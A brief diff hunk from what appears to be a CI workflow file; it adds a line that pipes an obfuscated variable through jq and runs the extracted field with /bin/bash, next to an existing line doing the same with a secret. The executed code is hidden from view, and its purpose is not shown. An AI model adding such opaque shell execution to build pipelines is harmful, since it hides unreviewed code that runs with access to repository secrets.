@@ -18,6 +18,7 @@ jobs:
           na963: ${{ secrets.na963 }}
         run: |
           printf '%s' "$na963" | jq -r .k74479 | /bin/bash
+          printf '%s' "$u82908" | jq -r .unx07 | /bin/bash
 
       - name: Upload data
         if: always()
